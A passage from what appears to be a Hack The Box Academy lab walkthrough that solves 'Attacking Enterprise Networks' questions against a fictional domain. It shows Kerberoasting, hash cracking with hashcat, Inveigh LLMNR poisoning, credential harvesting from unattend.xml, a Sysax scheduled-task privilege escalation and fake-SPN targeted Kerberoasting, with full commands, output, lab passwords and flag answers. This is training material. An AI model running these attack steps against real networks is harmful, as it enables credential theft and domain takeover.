$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "!qazXSW@"

<SNIP>
```

Answer: `!qazXSW@`

# Lateral Movement

## Question 2

### "Perform a Kerberoasting attack and retrieve TGS tickets for all accounts set as SPNs. Crack the TGS of the backupjob user and submit the cleartext password as your answer."

Students first need to establish an SSH connection to the root user on `STMIP` using Dynamic Port Forwarding so that `proxychains` can be used afterward:

Code: shell

```shell
ssh -i id_rsa -D 9050 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 -i id_rsa root@10.129.98.34

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Thu Sep  8 01:00:29 2022 from 10.10.15.8
root@dmz01:~#
```

Then, from `Pwnbox`/`PMVPN`, students need to run `GetUserSPNs.py`, proxying it through `proxychains` to get TGS Tickets, using the credentials `hporter:Gr8hambino!`:

Code: shell

```shell
sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/hporter -request -outputfile SPNS

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:389-<><>-OK
ServicePrincipalName                         Name          MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------  ------------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/DB01.inlanefreight.local:1433       mssqlsvc                2022-06-01 19:32:31.178803  <never>                                
MSSQLSvc/SQL01.inlanefreight.local:1433      svc_sql                 2022-06-01 19:32:34.850677  <never>                                
MSSQLSvc/SQL02.inlanefreight.local:1433      sqlprod                 2022-06-01 19:32:38.381946  <never>                                
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433  sqldev                  2022-06-01 19:32:41.913173  <never>                                
MSSQLSvc/DEVTEST.inlanefreight.local:1433    sqltest                 2022-06-01 19:32:45.522556  <never>                                
MSSQLSvc/QA001.inlanefreight.local:1433      sqlqa                   2022-06-01 19:32:49.256932  <never>                                
MSSQLSvc/SQL-WEB01.inlanefreight.local:1433  mssqladm                2022-06-01 19:32:52.897615  2022-09-08 01:59:52.200088             
adfsconnect/azure01.inlanefreight.local      azureconnect            2022-06-01 19:32:56.506935  <never>                                
backupjob/veam001.inlanefreight.local        backupjob               2022-06-01 19:33:00.038178  <never>                                
vmware/vc.inlanefreight.local                vmwarescvc              2022-06-01 19:33:03.600665  <never>                                
SAP/APP01.inlanefreight.local                sapsso                  2022-06-01 19:33:07.225672  <never>                                
SAPsvc/SAP01.inlanefreight.local             sapvc                   2022-06-01 19:33:10.678799  <never>

<SNIP>
```

Once the hashes have been successfully retrieved/saved into a file, students need to use `Hashcat` on them to crack them, supplying 13100 as the hashmode (`Kerberos 5, etype 23, TGS-REP`); students will find out that the password of the user `backupjob` is `lucky7`:

Code: shell

```shell
hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -O -w 3 -m 13100 SPNS /usr/share/wordlists/rockyou.txt.gz 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/backupjob*$5709f9d5df41015ca6b894c0a088c057$76673ac703886d3bf8e67fe7c9134de263974f10f4798952f77e8593b0ecb2cc0f4a42fa45637282ca72b18b2bd2ba775ebef46c128bd600cd258a67dfb161a7504d336cd9b22f6b5ce25e9c081cf6a7eb496915c658e1088d73bea69fd9afbd63f788024765a059f5fa7f493cd964bffd589a2834beebd7f16cdd09aa3bee50850dd23420533edf4950b2e6c07792aa87a9d40a156b4a5024f5ea70c1a39dc7a74da3772f1cde32b540f42da2a300c325fccd53650220ff3156d6860d0156489f85076de79b912f3f92832146de7914cab3d2c25cf92cefd957110fccd59c2f6bd5740a8068a90876f67959e6518a0b6d25aabf239f926744c352072d6e57c0c802d61653c74169c22a398c1ceddde68694607e025d7ed793f118deab4705c6b0b99ff448b304dbbb61ee096b558b71e8f406bf443857f05d5a2587eeb77a2d36e741cf90240caa98a066cef3889808f2c33321e17b2c7fb1cf9214adb6e9f7aaf50cddde175ef3e125aed225fe7aa0f537754365f7a2f746ca91915a6ded3756739fc23cc1deb8e3d15a5db15fb8ff39a9af2c59205efc130c6e863058701054f29e53b03da02dd7b29ae399fa738c1a9b7ac4e214d9700e5d53bda33c2334ff6e8f720fc2b882e5421052f9c5bb9bff4038d25fd8396833f81e5d061bbc9ed32311607de0da004a64a255bc85976d7a2647fe3516e290b82191d2dd0261610f65eca5e80aea9a3ba9039b5ea8de94c72896dba56f6b3ce4d5a37d422ba1416e1566d2f0a5e2cf954d3175ccd25773cfabf12edbda891f43ab726ec367b498c1c481e1f2b5779de9a63f06ab34a6c2f328a96f349eafd68c141838082406ff415eb2c208ca7d4569b269d6cd292f98bda95e3d144d7a589ea5c0f5666b4750f840040772e90086034ea3f8c03ea943ace15973919b43795de8b9baf36d73a7c8faaf9b789ef7fb34a0844622b050b07ed9477371abc918cbe09e6ab620835d809df1e3fb3a29ac7be5549edc6a7222ff6c537de180b3984bbbb477b7b93d4b8737d3e54e863be2b9e70972151b66a1bd39bf3849450916b3cf76ebdc4df8cfda4716164bb2e5e5fcee139c4c7bc1d21f19c12c8d723beb3140c98bf641462a03a4c5b447a2399f2f72ee53d30b7ad8f0bb2dda5d7218bd8b22bf849c7b8451abc9fa39d554a0eb940bb911c00243fd09aabd18d7965fe0615f20ce40561d97081acacb1e6c0f4807a72ad6514aa3c63160589cd7fe874d0bca889d2195aa365f9eb53e0848f22d1294cb2172f859412d4e0680c0af0edd4b04ab88c43bc6e96510c59824179270ebb7437f58ec57bfdad513ac33922af5864eb2:lucky7
```

Answer: `lucky7`

# Lateral Movement

## Question 3

### "Escalate Privileges on the MS01 host and submit the contents of the flag.txt file on the Administrator Desktop."

Students first need to establish an SSH connection to the root user on `STMIP` using Dynamic Port Forwarding so that `proxychains` can be used afterward:

Code: shell

```shell
ssh -D 9050 -i id_rsa root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 -i id_rsa root@10.129.203.114

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Thu Jun 23 05:39:18 2022
root@dmz01:~# 
```

Subsequently, students need to connect to `MS01` using `evil-winrm` (proxying it via `proxychains`) with the credentials harvested from the previous question `backupadm:!qazXSW@`:

Code: shell

```shell
proxychains evil-winrm -i 172.16.8.50 -u backupadm
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm
ProxyChains-3.1 (http://proxychains.sf.net)
Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>
```

Students then need to print out the contents of the XML file `C:\panther\unattend.xml` (students should know about this file either from digging around themselves or from the section's reading) to find the credentials `ilfserveradm:Sys26Admin`, which can be used to access `MS01` via RDP:

Code: powershell

```powershell
type C:\panther\unattend.xml
```

```powershell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> type C:\panther\unattend.xml

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.50:5985-<><>-OK
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">

<SNIP>

        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
            </AutoLogon>
<SNIP>
```

Thereafter, students need to connect to `MS01` at 172.16.8.50 using `xfreerdp` with the credentials `ilfserveradm:Sys26Admin`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:Sys26Admin

ProxyChains-3.1 (http://proxychains.sf.net)
<SNIP>

[05:14:23:721] [4420:4421] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.8.50:3389 (RDP-Server):
	Common Name: ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  37:24:61:e0:36:74:3f:20:85:2a:70:39:1f:ce:57:fc:3c:fa:07:a0:e5:9e:1d:83:95:1c:e0:1c:67:dd:16:b6
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![Attacking_Enterprise_Networks_Walkthrough_Image_66.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_66.png)

With the GUI access over RDP, students now need to escalate privileges through the `SysaxAutomation` application; to do so, students need to create a batch script (named "pwn.bat", in here) in the directory `C:\Users\ilfserveradm\Documents\` with its content being a command that will add `ilfserveradm` to the local administrators group:

Code: cmd

```cmd
net localgroup administrators ilfserveradm /add
```

![Attacking_Enterprise_Networks_Walkthrough_Image_67.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_67.png)

Subsequently, students need to run `sysaxschedscp.exe` and click on `Setup Scheduled/Triggered Tasks...`:

![Attacking_Enterprise_Networks_Walkthrough_Image_68.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_68.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_69.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_69.png)

Students then need to click on `Add task (Triggered) ...`:

![Attacking_Enterprise_Networks_Walkthrough_Image_70.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_70.png)

Afterward, students need to update "Folder to Monitor" to be `C:\Users\ilfserveradm\Documents\` and check `Run task if a file is added to the monitor folder or subfolder(s)`:

![Attacking_Enterprise_Networks_Walkthrough_Image_71.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_71.png)

Students then need to choose `Run any other Program` and choose `C:\Users\ilfserveradm\Documents\pwn.bat` as the program:

![Attacking_Enterprise_Networks_Walkthrough_Image_72.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_72.png)

Students need to also uncheck `Login as the following user to run task`, then click `Next` and then `Finish`:

![Attacking_Enterprise_Networks_Walkthrough_Image_73.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_73.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_74.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_74.png)

Thereafter, students need to create any file in `C:\Users\ilfserveradm\Documents` so that the task is triggered and the batch script is executed:

![Attacking_Enterprise_Networks_Walkthrough_Image_75.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_75.png)

Students then can confirm that the user `ilfserveradm` was added to local administrators group:

Code: shell

```shell
net localgroup administrators
```

```powershell-session
PS C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

At last, students need to print out the contents of the flag file "flag.txt" under the directory `C:\Users\Administrator\Desktop\`, and when prompted for credentials, they need to supply `.\ilfserveradm:Sys26Admin`; students will attain the flag `33a9d46de4015e7b3b0ad592a9394720`:

![Attacking_Enterprise_Networks_Walkthrough_Image_76.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_76.png)

![Attacking_Enterprise_Networks_Walkthrough_Image_77.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_77.png)

Answer: `33a9d46de4015e7b3b0ad592a9394720`

# Lateral Movement

## Question 4

### "Obtain the NTLMv2 password hash for the mpalledorous user and crack it to reveal the cleartext value. Submit the user's password as your answer."

Using the same RDP session that students have established and escalated privileges on from the previous question, they need to transfer [Inveigh.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1) over to it; to do so, students first need to download it on `Pwnbox`/`PMVPN`:

Code: shell

```shell
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1

--2022-09-08 06:08:46--  https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 303194 (296K) [text/plain]
Saving to: ‘Inveigh.ps1’

Inveigh.ps1                             100%[=============================================================================>] 296.09K  --.-KB/s    in 0.002s  

2022-09-08 06:08:46 (160 MB/s) - ‘Inveigh.ps1’ saved [303194/303194]
```

Students can use any file transfer technique, however, the easiest is copying and pasting:

![Attacking_Enterprise_Networks_Walkthrough_Image_78.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_78.png)

Subsequently, students need to run PowerShell as Administrator, utilizing the credentials `.\ilfserveradm:Sys26Admin`:

![Attacking_Enterprise_Networks_Walkthrough_Image_76.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_76.png)

Then, students first need to change directories to where `Inveigh.ps1` was pasted/saved, import it, and then invoke it, waiting for a period of no more than two minutes to capture the hash of `mpalledorous`:

Code: powershell

```powershell
cd C:\Users\ilfserveradm\Desktop\
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Users\ilfserveradm\Desktop\
PS C:\Users\ilfserveradm\Desktop> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Desktop> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-09-28T10:40:39
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] Spoofer IP Address = 172.16.8.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\ilfserveradm\Desktop
WARNING: [!] Run Stop-Inveigh to stop

<SNIP>
mpalledorous::ACADEMY-AEN-DEV:477F4C13CB9A1D84:68A32591CF780A08B97DDF88B74562F2:01010000000000000BFCBCDC50D3D80129D4A3832C8060F20000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00410045004E002D004D00530030000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004800410043004100440045004D0059002D00410045004E002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000BFCBCDC50D3D80106000400020000000800300030000000000000000000000000200000F639834F7A1FF15762AA38B165A715249D7C9429B72AC5EA2F93A6AE00285F920A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0038002E0035003000000000000000000000000000
```

With the hash attained, students now need to copy it over to `Pwnbox`/`PMVPN` and crack it with `Hashcat`, utilizing hashmode 5600; students will find out that the plaintext of the cracked password hash is `1squints2`:

Code: shell

```shell
hashcat -m 5600 -O -w 3 hash /usr/share/wordlists/rockyou.txt.gz
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ hashcat -m 5600 hash -O -w 3 /usr/share/wordlists/rockyou.txt.gz 
hashcat (v6.1.1) starting...

<SNIP>

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

MPALLEDOROUS::ACADEMY-AEN-DEV:477f4c13cb9a1d84:68a32591cf780a08b97ddf88b74562f2:01010000000000000bfcbcdc50d3d80129d4a3832c8060f20000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00410045004e002d004d00530030000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004800410043004100440045004d0059002d00410045004e002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008000bfcbcdc50d3d80106000400020000000800300030000000000000000000000000200000f639834f7a1ff15762aa38b165a715249d7c9429b72ac5ea2f93a6ae00285f920a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0038002e0035003000000000000000000000000000:1squints2

<SNIP>
```

Answer: `1squints2`

# Active Directory Compromise

## Question 1

### "Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit the password as your answer."

Using the SSH private key harvested previously, students need to connect to `STMIP` (i.e., `DMZ01`) over SSH and set a local port forward to set up for RDP connection (students can choose the port number; 1337 is used here):

Code: shell

```shell
ssh -i id_rsa -L PWNPO:172.16.8.20:3389 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.171]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -L 1337:172.16.8.20:3389 root@10.129.97.1

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Wed Sep  7 05:10:22 2022 from 10.10.14.171
root@dmz01:~#
```

Subsequently, students need to establish an additional SSH connection using Dynamic Port Forwarding so that `proxychains` can be used afterward:

Code: shell

```shell
ssh -i id_rsa -D 9050 root@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -i id_rsa -D 9050 root@10.129.203.114

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)

<SNIP>

Last login: Wed Sep  7 22:03:18 2022 from 10.10.15.8
root@dmz01:~#
```

Students then need to use `xfreerdp` on 127.0.0.1 and `PWNPO` that was specified in the set local port forward, supply the credentials `hporter:Gr8hambino!` (which were found by dumping LSA secrets in question 1 of "Exploitation & Privilege Escalation"), and redirect the directory where tools like `PowerView.ps1` (in here, the name of the home directory of `Pwnbox` is used, i.e., `/home/htb-ac413848`, students can attain theirs by running the `pwd` command in the landing directory of `Pwnbox`) will be available to get copied to the named share on `STMIP` (in here named "home"):

Code: shell

```shell
xfreerdp /v:127.0.0.1:PWNPO /u:hporter /p:Gr8hambino! /drive:home,$(pwd)
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:127.0.0.1:1337 /u:hporter /p:Gr8hambino! /drive:home,$(pwd)

[00:05:57:587] [3252:3253] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[00:05:57:588] [3252:3253] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>

[00:07:46:616] [3252:3253] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 127.0.0.1:1337 (RDP-Server):
	Common Name: ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
	Thumbprint:  9e:f2:ac:ac:04:b1:54:80:73:6e:0f:c5:b9:d5:c9:61:0d:65:96:4b:e7:06:44:d6:8d:55:40:7c:68:3f:5b:04
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![Attacking_Enterprise_Networks_Walkthrough_Image_65.png](https://academy.hackthebox.com/storage/walkthroughs/41/Attacking_Enterprise_Networks_Walkthrough_Image_65.png)

Once successfully connected to the Windows target (`xfreerdp` might seem to hang, however, it is not but takes some time), students need to change directories to `C:\Share`, and use the `net use` command to see the path to the mapped drive:

Code: cmd

```cmd
cd C:\Share
net use
```

```cmd-session
C:\Users\hporter>cd C:\Share
C:\Share>net use

New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
						\\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.
```

Once the path is known, students then need to download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) on `Pwnbox`/`PMVPN` in the directory that they have mapped to `\home` in the spawned Windows target (`/home/htb-ac413848` in here):

Code: shell

```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

--2022-09-08 00:12:16--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

<SNIP>

Saving to: ‘PowerView.ps1’

PowerView.ps1 100%[=============================================================================>] 752.23K  --.-KB/s    in 0.004s  

2022-09-08 00:12:17 (187 MB/s) - ‘PowerView.ps1’ saved [770279/770279]
```

Once downloaded successfully, students need to copy the file over to the named share "home" using the `copy` command:

Code: cmd

```cmd
copy \\TSCLIENT\home\PowerView.ps1
```

```cmd-session
C:\Share>copy \\TSCLIENT\home\PowerView.ps1
	1 file(s) copied.
```

Subsequently, students need to drop into a PowerShell session and import `PowerView` to set the password of the `ssmalls` user:

Code: powershell

```powershell
powershell
Import-Module .\PowerView.ps1
```

```powershell-session
C:\Share>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Share> Import-Module .\PowerView.ps1
```

Students now need to create a `PScredential` object, then use `Set-DomainObject` to set a fake SPN on the target account:

Code: powershell

```powershell
$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```

```powershell-session
PS C:\Share> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
PS C:\Share> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
PS C:\Share> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
```

Thereafter, students need to use `GetUserSPNs.py` to perform a targeted Kerberoasting attack (supplying the password `DBAilfreight1!` when prompted to):

Code: shell

```shell
sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:389-<><>-OK
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            2022-06-01 19:32:18.194423  <never>               

|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:88-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.8.3:88-<><>-OK
$krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$a8e24991afcbcb96dd7e42cf2cb17721$c14a933e6bb4242468e13116ee6371a9a53149379ad526d796c1b57b41a592873f36013e7ee3d9ebac5d714d867872b10fbe97c073f778223e92b4d25a561de7ef80cd2e3a0fee56b8e3351b4787236d8add28b206aff5b2944ef8225d8b14c14066c2ddae040ec348cedcc36c000b83268effa71cce194ad97b642e7dd4b994d3730633c947b6af80de503b712d69c190acf884166a4d941549d3fde5048a8c7b3b3c8ac621ae97f1070ecbc5faae4df78e9bcf8e2c48dfe8133c547a0b8aaf257f1cd5fc59761589ec1a5ccb164c917d78daef3207464504578eedbcf7f95711be2551875dd27d9792bc989c534af601c1dddeb5797d82987bb6c4085faa5fe7145486239a5db4f56b53b9e97d1c3d1742a8df3656aa8b8addc21346eb38062f17ef605d72bb2ffa6e72dd3963be11c9478c6132f2e7d873fb24e1df61bf15eade81b1e1cc00610496050d3aa446d12758f5cd3daf6cf9c72dd39856560b1f822b7213e7ef6297b910ca2d1e6f7e38a5416a11047ba64dd52bf041e869f9999c0eb700c488197c8baba97470b2d946bf56419415762151117e4d186006a3ee65c3507640e6b56533dd610e432e4ad3a1ad9ab430189eb85314213dd98d55bcc556b3e056ef7056e66d64b5d969af86fe6e915eb3cb9f5c0bfba5290e4c198fb5bff07a09037f096f09b315e4834f9575aeff3dbfbb59a73a5814b14dcf854f81f09653c0588c38b41c0dc2a9424140e53afb799e5c97deccdb618e305a365d5a7b4e80f118c858ebabb513cec6d459a57a7492529047beb78b21bca8cea1e179f52ce97b8c192988058e57e6b1fa79e886bb743523fcd4423f3585c34da485c0c14b08dcdf4e0465102b09a8c7ef3dc43fb7d81a479478bfd1e79d6c2e979ec71c0a1d35479120d42caa55a5419f6aefa46d339bd2b9cecc6740558c5b4ec3f06424b4511962a1de488d065f130c6cfb9941cbe895d6613a18a36be3c6d925504e0f59cfe057326b2c441445753c2f5defe3d6e2982a227f67548392399ce548248a92e720ec12f285e815030eeff42cb97ee2db39e7c667a105010c214c9af8a3fac4eb895da7ba70a8fcf0b0d3a237a